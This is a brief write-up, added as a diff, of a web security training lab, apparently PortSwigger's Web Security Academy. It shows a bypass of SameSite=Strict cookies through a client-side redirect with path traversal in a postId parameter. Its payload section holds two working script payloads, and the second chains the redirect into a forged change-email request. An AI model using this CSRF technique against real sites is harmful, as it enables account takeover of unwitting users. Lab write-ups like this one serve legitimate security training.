@@ -1,0 +1,18 @@
+write up:
+    see in post login : samesite = strict
+    it means you have to bypass through redirection url with your input
+    after trying post a comment => web redirected you through confirmation => back in post id
+    we can bypass this.
+
+    try read file src js we captured that they read id as param
+    try id/../../my-account => they back to my account page
+
+
+payload:
+<script>
+document.location="https://0a2900f103e9ba90c5bfd2c600a10028.web-security-academy.net/post/comment/confirmation?postId=10././../my-account"
+</script>
+
+<script>
+    document.location="https://0a2900f103e9ba90c5bfd2c600a10028.web-security-academy.net/post/comment/confirmation?postId=10/../../my-account/change-email?email=123%40gmail.com%26submit=1"
+</script>
